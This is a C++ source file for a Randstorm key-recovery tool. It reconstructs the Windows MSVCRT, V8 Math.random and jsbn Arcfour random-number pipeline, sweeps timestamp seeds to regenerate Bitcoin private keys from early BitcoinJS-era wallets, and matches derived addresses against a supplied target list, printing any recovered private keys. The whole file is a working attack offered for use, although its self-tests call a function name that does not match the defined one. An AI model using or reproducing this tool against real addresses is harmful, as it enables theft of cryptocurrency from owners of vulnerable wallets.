// randstorm_recon.cpp
// Chrome + jsbn SecureRandom key recovery, Windows path.
//
// ---------------------------------------------------------------------------
// PIPELINE (verified against V8 3.5.0 src/v8.cc + platform-win32.cc,
//           and jsbn.js / jsbn2.js / prng4.js / rng.js from BitcoinJS 0.1.x):
//
//   1. Process starts. OS::Setup() runs once:
//         seed = (uint32_t)TimeCurrentMillis()   // ms since Unix epoch
//         srand(seed)
//
//   2. Isolate starts. On FIRST call to Math.random() in the isolate,
//      V8's seed_random() fires and calls MSVCRT rand() twice:
//         state[0] = rand()   // MSVCRT LCG, 15-bit output
//         state[1] = rand()
//
//   3. Each call to Math.random():
//         state[0] = 18273 * (state[0] & 0xFFFF) + (state[0] >> 16)
//         state[1] = 36969 * (state[1] & 0xFFFF) + (state[1] >> 16)
//         r = (state[0] << 14) + (state[1] & 0x3FFFF)   // 32 bits
//         return r / 2^32
//
//   4. jsbn rng.js fills its 256-byte pool with:
//         128x: t = floor(65536 * Math.random()) = r >> 16
//               pool[2i] = t >>> 8;  pool[2i+1] = t & 0xFF
//
//   5. jsbn rng_seed_time() fires twice:
//         call 1 at pool init:   pptr=0  -> pool[0..3] ^= T1
//         call 2 at first byte:  pptr=4  -> pool[4..7] ^= T2
//
//   6. Arcfour KSA over the 256-byte pool.
//
//   7. rng_get_bytes draws n bytes via Arcfour PRGA.
//      BigInteger(256, rng) draws 33 bytes and discards byte 0, uses 1..32.
//
//   8. value.mod(n-1).add(1) -> private key.
//
// ---------------------------------------------------------------------------
// SWEEP AXES:
//   S      = process init time in ms since Unix epoch  (MSVCRT srand seed)
//   d      = page-load lag from process init           (T_page = S + d)
//
// ---------------------------------------------------------------------------

#include "crypto.h"
#include "secp256k1.h"
#include "base58.h"
#include "util.h"

#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <cstddef>
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <unordered_set>
#include <mutex>
#include <thread>
#include <atomic>
#include <stdexcept>
#include <exception>
#include <limits>

// ===========================================================================
// PRNG reconstruction
// ===========================================================================

namespace randstorm {

// ---- MSVCRT rand (Windows C runtime) ----
struct MsVcrtRand {
    uint32_t state;

    void srand(uint32_t seed) { state = seed; }

    uint32_t rand() {
        state = state * 214013u + 2531011u;
        return (state >> 16) & 0x7FFFu;
    }
};

// ---- V8 3.5.0 Math.random() ----
struct Mwc1616 {
    uint32_t state0;
    uint32_t state1;

    void seed_from_v8_windows(uint32_t seed_ms, int pre_calls = 0) {
        MsVcrtRand rng;
        rng.srand(seed_ms);
        for (int i = 0; i < pre_calls; ++i) rng.rand();
        state0 = rng.rand();
        state1 = rng.rand();
    }

    uint32_t next() {
        state0 = 18273u * (state0 & 0xFFFFu) + (state0 >> 16);
        state1 = 36969u * (state1 & 0xFFFFu) + (state1 >> 16);
        return (state0 << 14) + (state1 & 0x3FFFFu);
    }

    uint16_t next16() {
        return (uint16_t)(next() >> 16);
    }
};

// ---- Arcfour (jsbn prng4.js) ----
struct ArcfourState {
    uint8_t S[256];
    uint8_t i;
    uint8_t j;
};

inline void arcfour_ksa(ArcfourState& st, const uint8_t* key, size_t key_len) {
    for (int n = 0; n < 256; ++n) st.S[n] = (uint8_t)n;
    uint8_t j = 0;
    for (int n = 0; n < 256; ++n) {
        j = (uint8_t)(j + st.S[n] + key[n % key_len]);
        uint8_t t = st.S[n];
        st.S[n] = st.S[j];
        st.S[j] = t;
    }
    st.i = 0;
    st.j = 0;
}

inline uint8_t arcfour_next(ArcfourState& st) {
    st.i = (uint8_t)(st.i + 1);
    st.j = (uint8_t)(st.j + st.S[st.i]);
    uint8_t t = st.S[st.i];
    st.S[st.i] = st.S[st.j];
    st.S[st.j] = t;
    return st.S[(uint8_t)(t + st.S[st.i])];
}

// ---- XOR patterns for the jsbn timestamp mix ----
enum class XorPattern : uint8_t {
    DualSame    = 0,
    SingleFirst = 1,
    None        = 2
};

inline void xor_u32_at(uint8_t* p, uint32_t x) {
    p[0] ^= (uint8_t)( x        & 0xFFu);
    p[1] ^= (uint8_t)((x >>  8) & 0xFFu);
    p[2] ^= (uint8_t)((x >> 16) & 0xFFu);
    p[3] ^= (uint8_t)((x >> 24) & 0xFFu);
}

inline void apply_xor_pattern(uint8_t pool[256], XorPattern pattern, uint32_t T) {
    switch (pattern) {
        case XorPattern::DualSame:
            xor_u32_at(pool + 0, T);
            xor_u32_at(pool + 4, T);
            break;
        case XorPattern::SingleFirst:
            xor_u32_at(pool + 0, T);
            break;
        case XorPattern::None:
            break;
    }
}

inline void build_base_pool(Mwc1616& rng, uint8_t base_pool[256]) {
    for (int j = 0; j < 128; ++j) {
        uint16_t t16 = rng.next16();
        base_pool[2*j]     = (uint8_t)(t16 >> 8);
        base_pool[2*j + 1] = (uint8_t)(t16 & 0xFFu);
    }
}

inline void draw_from_pool(const uint8_t pool[256], uint8_t* out, size_t n) {
    ArcfourState st;
    arcfour_ksa(st, pool, 256);
    for (size_t k = 0; k < n; ++k) out[k] = arcfour_next(st);
}

inline void derive_key_material(uint32_t S_seed,
                                uint32_t T_page,
                                XorPattern pattern,
                                bool skip_first,
                                uint8_t out[32],
                                int pre_calls = 0) {
    Mwc1616 rng;
    rng.seed_from_v8_windows(S_seed, pre_calls);

    uint8_t pool[256];
    build_base_pool(rng, pool);
    apply_xor_pattern(pool, pattern, T_page);

    uint8_t buf[33];
    draw_from_pool(pool, buf, 33);
    if (skip_first) std::memcpy(out, buf + 1, 32);
    else            std::memcpy(out, buf, 32);
}

} // namespace randstorm

// ===========================================================================
// secp256k1 order + modular reduction
// ===========================================================================

static const uint8_t ORDER_MINUS_1[32] = {
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFE,
    0xBA,0xAE,0xDC,0xE6,0xAF,0x48,0xA0,0x3B,
    0xBF,0xD2,0x5E,0x8C,0xD0,0x36,0x41,0x40
};

static int cmp_256(const uint8_t a[32], const uint8_t b[32]) {
    for (int i = 0; i < 32; ++i) {
        if (a[i] < b[i]) return -1;
        if (a[i] > b[i]) return 1;
    }
    return 0;
}

static void sub_256(uint8_t out[32], const uint8_t a[32], const uint8_t b[32]) {
    int borrow = 0;
    for (int i = 31; i >= 0; --i) {
        int diff = (int)a[i] - (int)b[i] - borrow;
        if (diff < 0) { diff += 256; borrow = 1; } else borrow = 0;
        out[i] = (uint8_t)diff;
    }
}

static void reduce_mod_order(uint8_t buf[32]) {
    if (cmp_256(buf, ORDER_MINUS_1) >= 0) {
        uint8_t tmp[32];
        sub_256(tmp, buf, ORDER_MINUS_1);
        std::memcpy(buf, tmp, 32);
    }
    int carry = 1;
    for (int i = 31; i >= 0 && carry; --i) {
        int sum = (int)buf[i] + carry;
        buf[i] = (uint8_t)(sum & 0xFF);
        carry = sum >> 8;
    }
}

// ===========================================================================
// IO helpers
// ===========================================================================

static void trim(std::string& s) {
    while (!s.empty() && (s.back() == '\r' || s.back() == '\n' ||
                          s.back() == ' ' || s.back() == '\t'))
        s.pop_back();
    size_t i = 0;
    while (i < s.size() && (s[i] == ' ' || s[i] == '\t')) i++;
    if (i) s.erase(0, i);
}

static void load_address_file(const std::string& path,
                              std::unordered_set<std::string>& out) {
    std::ifstream f(path);
    if (!f) throw std::runtime_error("cannot open address file: " + path);
    std::string line;
    while (std::getline(f, line)) {
        trim(line);
        if (line.empty() || line[0] == '#') continue;
        out.insert(line);
    }
}

struct Window {
    uint64_t start;
    uint64_t end;
    std::string label;
};

static std::vector<Window> load_windows_file(const std::string& path) {
    std::ifstream f(path);
    if (!f) throw std::runtime_error("cannot open windows file: " + path);
    std::vector<Window> out;
    std::string line;
    int line_no = 0;
    while (std::getline(f, line)) {
        line_no++;
        trim(line);
        if (line.empty() || line[0] == '#') continue;
        std::stringstream ss(line);
        std::string s_start, s_end, label;
        if (!std::getline(ss, s_start, ',')) continue;
        if (!std::getline(ss, s_end, ',')) continue;
        std::getline(ss, label);
        trim(s_start); trim(s_end); trim(label);
        if (s_start.empty() || s_end.empty())
            throw std::runtime_error("malformed window at line " + std::to_string(line_no));
        Window w;
        w.start = parse_u64(s_start);
        w.end   = parse_u64(s_end);
        w.label = label.empty() ? ("w" + std::to_string(line_no)) : label;
        if (w.end < w.start)
            throw std::runtime_error("window end < start at line " + std::to_string(line_no));
        out.push_back(w);
    }
    return out;
}

// ===========================================================================
// scan engine
// ===========================================================================

struct ScanContext {
    randstorm::XorPattern pattern;
    uint64_t d_min;
    uint64_t d_max;
    bool skip_first_byte;
    int pre_calls;
    const std::unordered_set<std::string>* targets;
    FILE* fout;
    std::mutex* out_mutex;
    bool dump_all;
    bool no_p2sh;
    bool quiet;

    std::atomic<uint64_t> total_scanned{0};
    std::atomic<uint64_t> total_matched{0};
};

struct ScanRange {
    uint64_t s_start;
    uint64_t s_end;
    std::string label;
};

static void scan_range_impl(ScanContext* ctx, const ScanRange& range) {
    using namespace randstorm;

    uint64_t scanned = 0;
    uint64_t matched = 0;
    uint64_t last_report = 0;

    const bool skip_p2sh  = ctx->no_p2sh;
    const bool skip_first = ctx->skip_first_byte;
    const XorPattern pat  = ctx->pattern;
    const uint64_t dmin   = ctx->d_min;
    const uint64_t dmax   = ctx->d_max;
    const int      preN   = ctx->pre_calls;

    for (uint64_t S = range.s_start; ; ++S) {
        const uint32_t S_seed = (uint32_t)S;

        Mwc1616 rng;
        rng.seed_from_v8_windows(S_seed, preN);
        uint8_t base_pool[256];
        build_base_pool(rng, base_pool);

        for (uint64_t d = dmin; ; ++d) {
            if (d > std::numeric_limits<uint64_t>::max() - S) break;
            const uint64_t T_page_64 = S + d;
            const uint32_t T_page = (uint32_t)T_page_64;

            uint8_t pool[256];
            std::memcpy(pool, base_pool, 256);
            apply_xor_pattern(pool, pat, T_page);

            uint8_t buf[33];
            draw_from_pool(pool, buf, 33);

            uint8_t priv[32];
            if (skip_first) std::memcpy(priv, buf + 1, 32);
            else            std::memcpy(priv, buf, 32);

            reduce_mod_order(priv);

            ++scanned;

            uint8_t pub33[33], pub65[65];
            if (privkey_to_both_pubkeys(priv, pub33, pub65)) {
                std::string a_p2pkh_c = pubkey_to_p2pkh_compressed(pub33);
                std::string a_p2pkh_u = pubkey_to_p2pkh_uncompressed(pub65);
                std::string a_p2sh_c, a_p2sh_u;
                if (!skip_p2sh) {
                    a_p2sh_c = pubkey_to_p2sh_compressed(pub33);
                    a_p2sh_u = pubkey_to_p2sh_uncompressed(pub65);
                }

                std::string matched_label;
                bool hit = false;
                if (ctx->targets) {
                    if (ctx->targets->count(a_p2pkh_c)) { hit = true; matched_label = "p2pkh_c"; }
                    if (ctx->targets->count(a_p2pkh_u)) { hit = true; matched_label += (matched_label.empty() ? "" : ",") + std::string("p2pkh_u"); }
                    if (!a_p2sh_c.empty() && ctx->targets->count(a_p2sh_c)) { hit = true; matched_label += (matched_label.empty() ? "" : ",") + std::string("p2sh_c"); }
                    if (!a_p2sh_u.empty() && ctx->targets->count(a_p2sh_u)) { hit = true; matched_label += (matched_label.empty() ? "" : ",") + std::string("p2sh_u"); }
                }

                if (hit || ctx->dump_all) {
                    std::string priv_hex = hex_encode(priv, 32);
                    std::lock_guard<std::mutex> lk(*ctx->out_mutex);
                    std::fprintf(ctx->fout,
                        "%s,%llu,%llu,%llu,%s,%s,%s,%s,%s,%s\n",
                        range.label.c_str(),
                        (unsigned long long)S,
                        (unsigned long long)T_page_64,
                        (unsigned long long)d,
                        priv_hex.c_str(),
                        a_p2pkh_c.c_str(),
                        a_p2pkh_u.c_str(),
                        a_p2sh_c.c_str(),
                        a_p2sh_u.c_str(),
                        matched_label.c_str());
                    std::fflush(ctx->fout);
                    if (hit) {
                        ++matched;
                        if (!ctx->quiet) {
                            std::fprintf(stderr,
                                "\n*** MATCH *** [%s] S=%llu T_page=%llu d=%llu label=%s\n"
                                "    privkey: %s\n"
                                "    p2pkh_c: %s\n"
                                "    p2pkh_u: %s\n"
                                "    p2sh_c : %s\n"
                                "    p2sh_u : %s\n\n",
                                range.label.c_str(),
                                (unsigned long long)S,
                                (unsigned long long)T_page_64,
                                (unsigned long long)d,
                                matched_label.c_str(),
                                priv_hex.c_str(),
                                a_p2pkh_c.c_str(),
                                a_p2pkh_u.c_str(),
                                a_p2sh_c.c_str(),
                                a_p2sh_u.c_str());
                            std::fflush(stderr);
                        }
                    }
                }
            }

            if (!ctx->quiet && scanned - last_report >= 500000) {
                last_report = scanned;
                std::fprintf(stderr, "[%s] progress scanned=%llu matched=%llu\n",
                             range.label.c_str(),
                             (unsigned long long)scanned,
                             (unsigned long long)matched);
                std::fflush(stderr);
            }

            if (d >= dmax) break;
        }

        if (S >= range.s_end) break;
    }

    ctx->total_scanned += scanned;
    ctx->total_matched += matched;

    if (!ctx->quiet)
        std::fprintf(stderr, "[%s] done. scanned=%llu matched=%llu\n",
                     range.label.c_str(),
                     (unsigned long long)scanned,
                     (unsigned long long)matched);
}

static void scan_range(ScanContext* ctx, ScanRange range) {
    try { scan_range_impl(ctx, range); }
    catch (const std::exception& e) {
        std::lock_guard<std::mutex> lk(*ctx->out_mutex);
        std::fprintf(stderr, "[%s] worker aborted: %s\n", range.label.c_str(), e.what());
    } catch (...) {
        std::lock_guard<std::mutex> lk(*ctx->out_mutex);
        std::fprintf(stderr, "[%s] worker aborted: unknown exception\n", range.label.c_str());
    }
}

// ===========================================================================
// self test
// ===========================================================================

static int selftest() {
    using namespace randstorm;

    {
        MsVcrtRand rng;
        rng.srand(1);
        uint32_t a = rng.rand();
        uint32_t b = rng.rand();
        std::printf("MSVCRT rand(seed=1): r1=%u r2=%u\n", a, b);
        if (a != 41 || b != 18467) {
            std::printf("FAIL: MSVCRT rand constants or shift wrong\n");
            return 1;
        }
        std::printf("OK: MSVCRT rand matches expected sequence\n");
    }

    {
        Mwc1616 r;
        r.state0 = 41;
        r.state1 = 18467;
        uint32_t v = r.next();
        std::printf("MWC first step: state0=0x%08X state1=0x%08X out=0x%08X\n",
                    r.state0, r.state1, v);
        if (r.state0 != 749193u) {
            std::printf("FAIL: state0 update wrong\n");
            return 1;
        }
        if (r.state1 != 682706523u) {
            std::printf("FAIL: state1 update wrong\n");
            return 1;
        }
        if (v != 3684927067u) {
            std::printf("FAIL: output combination wrong (got %u)\n", v);
            return 1;
        }
        std::printf("OK: MWC constants, shift, mask correct\n");
    }

    {
        uint8_t a[32], b[32];
        draw_key_material(1000000000u, 1000000000u, XorPattern::DualSame, true, a, 0);
        draw_key_material(1000000001u, 1000000000u, XorPattern::DualSame, true, b, 0);
        if (std::memcmp(a, b, 32) == 0) {
            std::printf("FAIL: adjacent seeds produced identical material\n");
            return 1;
        }
        std::printf("OK: adjacent seeds diverge\n");
    }

    {
        uint8_t a[32], b[32];
        draw_key_material(1000000000u, 1000000000u, XorPattern::DualSame, true, a, 0);
        draw_key_material(1000000000u, 1000000001u, XorPattern::DualSame, true, b, 0);
        if (std::memcmp(a, b, 32) == 0) {
            std::printf("FAIL: adjacent T_page produced identical material\n");
            return 1;
        }
        std::printf("OK: adjacent T_page diverge\n");
    }

    {
        uint8_t z[256];
        std::memset(z, 0, 256);
        apply_xor_pattern(z, XorPattern::DualSame, 0x01020304u);
        if (z[0] != 0x04 || z[1] != 0x03 || z[2] != 0x02 || z[3] != 0x01) {
            std::printf("FAIL: dual-same pool[0..3] endianness wrong\n");
            return 1;
        }
        if (z[4] != 0x04 || z[5] != 0x03 || z[6] != 0x02 || z[7] != 0x01) {
            std::printf("FAIL: dual-same pool[4..7] wrong\n");
            return 1;
        }
        for (int i = 8; i < 256; ++i) {
            if (z[i] != 0) {
                std::printf("FAIL: dual-same touched byte %d\n", i);
                return 1;
            }
        }
        std::printf("OK: dual-same XORs only pool[0..3] and pool[4..7]\n");
    }

    {
        uint8_t a[32], b[32];
        draw_key_material(1000000000u, 1000000000u, XorPattern::DualSame, true,  a, 0);
        draw_key_material(1000000000u, 1000000000u, XorPattern::DualSame, false, b, 0);
        if (std::memcmp(a, b, 32) == 0) {
            std::printf("FAIL: skip-first == keep-first\n");
            return 1;
        }
        std::printf("OK: skip-first vs keep-first differ\n");
    }

    {
        uint8_t a[32], b[32];
        draw_key_material(1000000000u, 1000000000u, XorPattern::DualSame, true, a, 0);
        draw_key_material(1000000000u, 1000000000u, XorPattern::DualSame, true, b, 1);
        if (std::memcmp(a, b, 32) == 0) {
            std::printf("FAIL: pre_calls=0 == pre_calls=1\n");
            return 1;
        }
        std::printf("OK: pre_calls axis changes output\n");
    }

    return 0;
}

// ===========================================================================
// usage
// ===========================================================================

static void usage(const char* prog) {
    std::fprintf(stderr,
        "randstorm_recon - jsbn SecureRandom key recovery (Chrome on Windows,\n"
        "                  V8 3.5.0 seed path, 2011-2013 era)\n\n"
        "Usage:\n"
        "  %s --filter-file addresses.txt [options]\n\n"
        "Targets:\n"
        "  --filter <addr>            add one address (repeatable)\n"
        "  --filter-file <path>       load addresses, one per line\n"
        "                             (auto: if no '3...' present, P2SH skipped)\n\n"
        "Sweep window (ms since Unix epoch, process init time S):\n"
        "  --windows-file <path>      load windows (default: windows.txt)\n"
        "  --start <ms> --end <ms>    single window shortcut (S range)\n\n"
        "Timestamp XOR pattern (default: dual-same, unmodified jsbn):\n"
        "  --xor-pattern <name>\n"
        "      dual-same    pool[0..3] ^= T_page, pool[4..7] ^= T_page\n"
        "      single-first pool[0..3] ^= T_page only\n"
        "      none         no timestamp XOR\n\n"
        "Delta sweep (T_page = S + d):\n"
        "  --delta-min <ms>           min page-load lag. default: 0\n"
        "  --delta-max <ms>           max page-load lag.\n"
        "                             default: 60000 (60s)\n\n"
        "MSVCRT pre-calls:\n"
        "  --pre-calls <n>            number of MSVCRT rand() calls that\n"
        "                             happened before V8's own two. default: 0\n\n"
        "jsbn byte handling:\n"
        "  --keep-first-byte          use bytes 0..31 of Arcfour stream.\n"
        "                             default: skip byte 0 (standard jsbn).\n\n"
        "Options:\n"
        "  --threads <n>              worker count (default: hardware_concurrency)\n"
        "  --out <path>               CSV output (default stdout)\n"
        "  --quiet                    suppress progress and match banner\n"
        "  --dump-all                 emit every candidate (huge -- do not use)\n"
        "  --no-p2sh                  force-skip 3... derivations\n"
        "  --selftest                 run internal consistency checks and exit\n\n"
        "Output CSV columns:\n"
        "  window,S_ms,T_page_ms,d_ms,privkey_hex,\n"
        "  addr_p2pkh_c,addr_p2pkh_u,addr_p2sh_c,addr_p2sh_u,matched\n",
        prog);
}

// ===========================================================================
// main
// ===========================================================================

int main(int argc, char** argv) {
    using namespace randstorm;

    uint64_t start = 0, end = 0;
    bool have_start = false, have_end = false;
    bool quiet = false, dump_all = false, no_p2sh = false;
    bool skip_first_byte = true;
    int pre_calls = 0;
    std::string out_path, windows_file = "windows.txt";
    std::vector<std::string> filter_list, filter_files;
    XorPattern pattern = XorPattern::DualSame;

    bool dmin_set = false, dmax_set = false;
    uint64_t d_min = 0, d_max = 0;

    int threads = 0;
    bool run_selftest = false;

    try {
        for (int i = 1; i < argc; ++i) {
            std::string a = argv[i];
            auto need = [&](const char* name) -> const char* {
                if (i + 1 >= argc)
                    throw std::runtime_error(std::string("missing value for ") + name);
                return argv[++i];
            };
            if (a == "--start") { start = parse_u64(need("--start")); have_start = true; }
            else if (a == "--end") { end = parse_u64(need("--end")); have_end = true; }
            else if (a == "--out") { out_path = need("--out"); }
            else if (a == "--windows-file") { windows_file = need("--windows-file"); }
            else if (a == "--filter") { filter_list.emplace_back(need("--filter")); }
            else if (a == "--filter-file") { filter_files.emplace_back(need("--filter-file")); }
            else if (a == "--threads") {
                uint64_t n = parse_u64(need("--threads"));
                if (n > 4096) n = 4096;
                threads = (int)n;
            }
            else if (a == "--xor-pattern") {
                std::string h = need("--xor-pattern");
                if      (h == "dual-same")    pattern = XorPattern::DualSame;
                else if (h == "single-first") pattern = XorPattern::SingleFirst;
                else if (h == "none")         pattern = XorPattern::None;
                else throw std::runtime_error("unknown xor-pattern: " + h);
            }
            else if (a == "--delta-min") { d_min = parse_u64(need("--delta-min")); dmin_set = true; }
            else if (a == "--delta-max") { d_max = parse_u64(need("--delta-max")); dmax_set = true; }
            else if (a == "--pre-calls") {
                uint64_t n = parse_u64(need("--pre-calls"));
                if (n > 1024) n = 1024;
                pre_calls = (int)n;
            }
            else if (a == "--keep-first-byte") { skip_first_byte = false; }
            else if (a == "--quiet") { quiet = true; }
            else if (a == "--dump-all") { dump_all = true; }
            else if (a == "--no-p2sh") { no_p2sh = true; }
            else if (a == "--selftest") { run_selftest = true; }
            else if (a == "-h" || a == "--help") { usage(argv[0]); return 0; }
            else { std::fprintf(stderr, "unknown arg: %s\n", a.c_str()); return 1; }
        }

        if (run_selftest) return selftest();

        if (!dmin_set) d_min = 0;
        if (!dmax_set) d_max = 60000;
        if (d_max < d_min) throw std::runtime_error("--delta-max < --delta-min");

        std::vector<Window> windows;
        if (have_start && have_end) {
            if (end < start) throw std::runtime_error("--end < --start");
            Window w; w.start = start; w.end = end; w.label = "single";
            windows.push_back(w);
        } else {
            windows = load_windows_file(windows_file);
        }
        if (windows.empty()) { std::fprintf(stderr, "no windows\n"); return 1; }

        std::unordered_set<std::string> targets;
        for (auto& a : filter_list) targets.insert(a);
        for (auto& p : filter_files) load_address_file(p, targets);

        bool have_targets = !targets.empty();
        if (!have_targets && !dump_all) {
            std::fprintf(stderr, "no targets given. add --filter-file or --filter.\n");
            return 1;
        }

        bool auto_no_p2sh = false;
        if (have_targets) {
            bool any_p2sh = false;
            for (const auto& addr : targets) {
                if (!addr.empty() && addr[0] == '3') { any_p2sh = true; break; }
            }
            if (!any_p2sh) auto_no_p2sh = true;
            if (!quiet && auto_no_p2sh)
                std::fprintf(stderr,
                    "note: no '3...' addresses in target set, "
                    "auto-skipping P2SH derivations\n");
        }

        if (threads <= 0) {
            unsigned hc = std::thread::hardware_concurrency();
            threads = hc > 0 ? (int)hc : 4;
            if (threads <= 0) threads = 4;
        }

        const char* pattern_name =
            pattern == XorPattern::DualSame    ? "dual-same" :
            pattern == XorPattern::SingleFirst ? "single-first" :
                                                 "none";

        if (!quiet) {
            std::fprintf(stderr,
                "xor=%s delta=[%llu..%llu] pre_calls=%d threads=%d targets=%zu "
                "windows=%zu p2sh=%s bytes=%s\n",
                pattern_name,
                (unsigned long long)d_min, (unsigned long long)d_max,
                pre_calls,
                threads, targets.size(), windows.size(),
                (no_p2sh || auto_no_p2sh) ? "off" : "on",
                skip_first_byte ? "1..32" : "0..31");
        }

        FILE* fout = stdout;
        if (!out_path.empty()) {
            fout = std::fopen(out_path.c_str(), "w");
            if (!fout) { std::fprintf(stderr, "cannot open %s\n", out_path.c_str()); return 1; }
        }

        std::fprintf(fout,
            "window,S_ms,T_page_ms,d_ms,privkey_hex,"
            "addr_p2pkh_c,addr_p2pkh_u,addr_p2sh_c,addr_p2sh_u,matched\n");

        std::mutex out_mutex;
        ScanContext ctx;
        ctx.pattern = pattern;
        ctx.d_min = d_min;
        ctx.d_max = d_max;
        ctx.skip_first_byte = skip_first_byte;
        ctx.pre_calls = pre_calls;
        ctx.targets = have_targets ? &targets : nullptr;
        ctx.fout = fout;
        ctx.out_mutex = &out_mutex;
        ctx.dump_all = dump_all;
        ctx.no_p2sh = no_p2sh || auto_no_p2sh;
        ctx.quiet = quiet;

        for (const auto& w : windows) {
            uint64_t total_S;
            if (w.end == std::numeric_limits<uint64_t>::max() && w.start == 0) {
                total_S = std::numeric_limits<uint64_t>::max();
            } else {
                total_S = w.end - w.start + 1;
            }

            uint64_t per = total_S / (uint64_t)threads;
            if (per == 0) per = 1;

            std::vector<ScanRange> ranges;
            ranges.reserve(threads);
            for (int i = 0; i < threads; ++i) {
                uint64_t s = w.start + (uint64_t)i * per;
                if (s < w.start) break;
                if (s > w.end) break;
                uint64_t e;
                if (i == threads - 1) {
                    e = w.end;
                } else {
                    if (per - 1 > std::numeric_limits<uint64_t>::max() - s) e = w.end;
                    else e = s + per - 1;
                }
                if (e > w.end) e = w.end;
                if (e < s) e = s;
                ScanRange r;
                r.s_start = s;
                r.s_end   = e;
                r.label   = w.label + "/t" + std::to_string(i);
                ranges.push_back(r);
            }

            // d_count overflow-safe.
            uint64_t d_count;
            if (d_max == std::numeric_limits<uint64_t>::max() && d_min == 0) {
                d_count = std::numeric_limits<uint64_t>::max();
            } else {
                d_count = d_max - d_min + 1;
            }

            uint64_t cand;
            if (d_count != 0 && total_S > std::numeric_limits<uint64_t>::max() / d_count) {
                cand = std::numeric_limits<uint64_t>::max();
            } else {
                cand = total_S * d_count;
            }

            if (!quiet)
                std::fprintf(stderr,
                    "[%s] %zu worker(s), S-range=%llu, d-range=%llu, "
                    "total candidates=%llu%s\n",
                    w.label.c_str(), ranges.size(),
                    (unsigned long long)total_S,
                    (unsigned long long)d_count,
                    (unsigned long long)cand,
                    (cand == std::numeric_limits<uint64_t>::max()) ? " (saturated)" : "");

            std::vector<std::thread> pool;
            pool.reserve(ranges.size());
            for (auto& r : ranges) pool.emplace_back(scan_range, &ctx, r);
            for (auto& th : pool) th.join();
        }

        if (!quiet)
            std::fprintf(stderr, "\nTOTAL scanned=%llu matched=%llu\n",
                         (unsigned long long)ctx.total_scanned.load(),
                         (unsigned long long)ctx.total_matched.load());

        if (fout != stdout) std::fclose(fout);
        return 0;
    }
    catch (const std::exception& e) {
        std::fprintf(stderr, "fatal: %s\n", e.what());
        return 1;
    }
}
